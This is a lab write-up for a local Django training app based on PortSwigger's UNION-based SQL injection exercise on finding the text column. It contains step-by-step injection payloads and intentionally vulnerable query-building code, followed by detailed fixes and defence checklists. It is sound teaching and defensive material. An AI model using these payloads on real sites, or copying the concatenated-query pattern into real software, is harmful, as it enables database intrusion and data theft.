# Lab 08 — SQL injection UNION attack, finding a column containing text

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text> |
| Lab id | `psw-sqli-08-find-text-column` |
| Vulnerability class | SQL Injection — UNION-based, text-column fingerprinting |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18008/> |
| Flag | `FLAG{psw-sqli-08-text-column-identified}` |

### Objective

The home page surfaces a random probe string (the `Challenge.token`). The `/filter` endpoint concatenates the `category` parameter into a three-column `SELECT` and the template only renders the third projected column. The attacker must first confirm the column count, then discover which of the three positions is rendered as text by injecting the known probe string into each slot via `UNION SELECT`. The flag is revealed when the probe string lands in the text-rendered column.

---

## 2. Exploit walkthrough

The lab teaches a specific sub-skill of UNION-based SQLi: once you know the column count, you still need to find the column whose value reaches the rendered page. Columns that hold numeric types or that the template discards are useless for data extraction.

**Step 0 — read the probe string**

Visit the home page and note the `Probe string` shown in the banner (for example `Xk3pQ9`). Every deployment mints a fresh token via `secrets.token_urlsafe(6)`.

**Step 1 — baseline request**

```http
GET /filter?category=Gifts HTTP/1.1
Host: 127.0.0.1:18008
```

The `Executed SQL` debug panel shows:

```sql
SELECT id, price, name
FROM products
WHERE category = 'Gifts' AND released = 1
```

Three "Gifts" rows are returned but only the `name` is drawn on screen — the `id` and `price` values never make it to the rendered card.

**Step 2 — confirm the column count with `UNION SELECT NULL`**

```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--+
```

The URL-decoded payload closes the quoted literal, appends a `UNION` with three `NULL` placeholders and comments out the trailing `AND released = 1`. The response returns without a database error, confirming the base query projects three columns.

**Step 3 — probe column 1**

Replace the first `NULL` with the probe string:

```
/filter?category=Gifts' UNION SELECT 'Xk3pQ9',NULL,NULL--+
```

An extra empty card is rendered (the template reads position 3, which is `NULL`). The `solved` check fails because the token sits in position 1.

**Step 4 — probe column 2**

```
/filter?category=Gifts' UNION SELECT NULL,'Xk3pQ9',NULL--+
```

Same result: no visible text, no flag. Position 2 corresponds to `price`, which the template ignores.

**Step 5 — probe column 3, trigger the solve**

```
/filter?category=Gifts' UNION SELECT NULL,NULL,'Xk3pQ9'--+
```

The executed SQL becomes:

```sql
SELECT id, price, name
FROM products
WHERE category = 'Gifts' UNION SELECT NULL,NULL,'Xk3pQ9'-- ' AND released = 1
```

The injected row's third value reaches the `displayed_names` list, the server-side solve scan finds `token` inside position 3 and the flag banner appears with `FLAG{psw-sqli-08-text-column-identified}`.

**Step 6 — why only column 3 counts**

The server-side check in `filter_products` only inspects `row[TEXT_COLUMN_INDEX]` (index `2`). Any payload that stores the probe in positions 0 or 1 is invisible to both the user and the solve checker — mirroring the real-world constraint that only the rendered column is useful for data exfiltration.

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/views.py:57-64](shop/views.py#L57-L64)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, price, name "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

The `category` value is pulled straight from `request.GET` and pasted between two literal single quotes. Attacker-supplied quotes or comments escape the quoted context and rewrite the rest of the query — the `' UNION SELECT ...--` payload lands here.

[shop/views.py:69-74](shop/views.py#L69-L74)

```python
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            rows = cursor.fetchall()
    except Exception as exc:
        error = f"Database error: {exc}"
```

`cursor.execute(query)` is called with a single argument — the already-composed string. The DB driver cannot tell code from data, so the injected `UNION` is treated as part of the query.

[shop/views.py:83-88](shop/views.py#L83-L88)

```python
        for row in rows:
            if len(row) > TEXT_COLUMN_INDEX:
                cell = row[TEXT_COLUMN_INDEX]
                if isinstance(cell, str) and token in cell:
                    solved = True
                    break
```

The solve check intentionally only looks at position 3 (`TEXT_COLUMN_INDEX = 2` at [shop/views.py:33](shop/views.py#L33)). This encodes the lesson: only the text-rendered column is an effective exfiltration channel.

### Template — what actually lands on screen

[shop/templates/shop/filter.html:37-40](shop/templates/shop/filter.html#L37-L40)

```django
{% for name in displayed_names %}
    <div class="product">
        <strong>{{ name|default_if_none:"" }}</strong>
    </div>
```

Only `displayed_names` — built from the third column in [shop/views.py:90-93](shop/views.py#L90-L93) — is printed. This is the server-side analogue of the PortSwigger lab premise where most columns are consumed by layout and only one bubbles up as readable text.

### Supporting model and seed

[shop/models.py:4-15](shop/models.py#L4-L15) — `Product` table has mixed column types. `price` is numeric (`DecimalField`), which would also fail an injected `UNION SELECT 'text',...` if the RDBMS were strict about type compatibility across a `UNION`; SQLite's loose typing keeps the lab forgiving.

[shop/management/commands/seed.py:50-52](shop/management/commands/seed.py#L50-L52) — every `seed` run generates a fresh probe token with `secrets.token_urlsafe(6)`, so the answer cannot be memorised — the learner must read the banner and inject it.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of `request.GET["category"]` into SQL** | Attacker controls the SQL grammar, not just the filter value. `UNION SELECT` becomes possible. |
| **No allow-list or type check on `category`** | Single quotes, comment sequences and `UNION` keywords all flow untouched into the query. |
| **Released-flag filter lives in the same concatenated string** | A trailing `--` comment silently drops the `AND released = 1` predicate, so unreleased rows are also exposed. |
| **Executed SQL is reflected to the client** ([shop/templates/shop/filter.html:25](shop/templates/shop/filter.html#L25)) | Hands the attacker a confirmation channel for every probe — no blind guessing required. |
| **SQLite's permissive typing** | Cross-type `UNION` payloads succeed where stricter databases (e.g. PostgreSQL) would reject them, making the lesson reproducible. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

Bind `category` as data. The driver then escapes it for you and a `'` inside the value is no longer a statement terminator.

```python
# shop/views.py — fixed
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, price, name "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])
        rows = cursor.fetchall()
```

With this change, `category=Gifts' UNION SELECT NULL,NULL,'X'--` is matched literally against the `category` column, returns zero rows and no `UNION` is ever parsed.

### 5.2 Use the ORM

The raw SQL here exists only so the vulnerability is visible. The equivalent ORM call binds parameters automatically and keeps the visibility gate on the database side:

```python
from .models import Product

def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")
    products = list(
        Product.objects
        .filter(category=category, released=True)
        .values("id", "price", "name")
    )
```

### 5.3 Allow-list the category

`category` is drawn from a closed set. Reject anything else before a query is composed:

```python
ALLOWED_CATEGORIES = {"Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing"}

if category not in ALLOWED_CATEGORIES:
    return HttpResponseBadRequest("unknown category")
```

This stops the payload at the view boundary, long before the DB driver sees it.

### 5.4 Stop reflecting the SQL string

Remove the `executed_sql` context value in [shop/views.py:102](shop/views.py#L102) and the `<pre class="sql">` block in [shop/templates/shop/filter.html:25](shop/templates/shop/filter.html#L25). Reflecting the composed query turns every probe into a free oracle. Keep it behind a debug-only feature flag.

### 5.5 Do not swallow DB errors to the UI

[shop/views.py:73-74](shop/views.py#L73-L74) pipes `exc` straight into the response. In production, log the error server-side and return a generic message. Detailed `sqlite3` errors leak column counts and type mismatches — exactly the signals a UNION attacker is hunting for.

### 5.6 Column-count stability

Projecting a stable, documented shape to the client (for example through a dedicated view or a Django serializer) makes UNION probing harder: the attacker can no longer casually discover column count by appending `NULL`s and watching for errors.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall

Deploy a WAF (Cloudflare, AWS WAF, ModSecurity + OWASP CRS) in front of the app. Relevant rule families:

- `REQUEST-942` — SQLi signatures (`UNION SELECT`, `--`, tautologies, hex-encoded `0x...` literals).
- `REQUEST-920` — protocol anomalies (oversized query strings, malformed UTF-8).
- `REQUEST-913` — scanner fingerprints (`sqlmap`, `nikto`).

A WAF buys time; it does not replace parameterisation.

### 6.2 Least-privilege database account

Give the app a database role with only:

- `SELECT` on `products` and `challenge`.
- No `UPDATE`, `INSERT`, `DELETE`, `DDL`.
- No access to `sqlite_master` equivalents in stricter RDBMS (`information_schema`, `pg_catalog`).

A read-only role prevents a UNION chain from mutating data even if the attacker upgrades the payload to stacked queries.

### 6.3 Network segmentation

- Loopback-only binding in [docker-compose.yml:10](docker-compose.yml#L10) (`127.0.0.1:18008:8000`) keeps this lab off the host network interface.
- In production, place the DB on a private subnet with no egress route and no inbound path from the internet.
- Disable `LOAD_FILE`, `INTO OUTFILE` (MySQL) or `COPY PROGRAM` (PostgreSQL) equivalents at the DB role level to block injection-to-RCE pivots.

### 6.4 Monitoring, rate limiting and anomaly detection

- Rate-limit `/filter` per client IP; UNION attackers iterate column counts and positions, producing obvious bursts.
- Alert on repeated `sqlite3.OperationalError` / `OperationalError` traces pointing at the same endpoint.
- Log the canonicalised query (or its hash) alongside the response status to detect payload variants.

### 6.5 Secrets and flag storage

The `Challenge.flag` value is stored in the DB next to the products. In production, secrets should not be colocated with attacker-reachable data; a separate secrets store (Vault, AWS Secrets Manager) plus a narrower role boundary is the correct pattern.

---

## 7. Defense-in-depth checklist

- [ ] All `cursor.execute` calls pass values via the parameter list, never via `+`, `%`, or f-strings.
- [ ] ORM queries preferred; raw SQL gated by review and lint rules (`bandit`, `semgrep`).
- [ ] Enumerable inputs validated against an allow-list before reaching the query layer.
- [ ] Executed SQL text is **not** returned to the client in any environment reachable by untrusted users.
- [ ] Database errors are logged, not surfaced verbatim in HTTP responses.
- [ ] Application role has the minimum privileges (`SELECT`-only where possible).
- [ ] Stacked queries disabled at the driver level where the RDBMS supports it.
- [ ] WAF with CRS in front of internet-facing endpoints.
- [ ] Rate limiting and structured error telemetry on every data-filtering endpoint.
- [ ] Business-visibility predicates (`released`, ownership, tenant id) enforced by views or row-level security rather than by a single `AND` in a concatenated string.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
- PortSwigger — [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Django docs — [Performing raw queries](https://docs.djangoproject.com/en/5.0/topics/db/sql/#performing-raw-queries) (note the explicit warning against string interpolation)
- OWASP Core Rule Set — <https://coreruleset.org/>
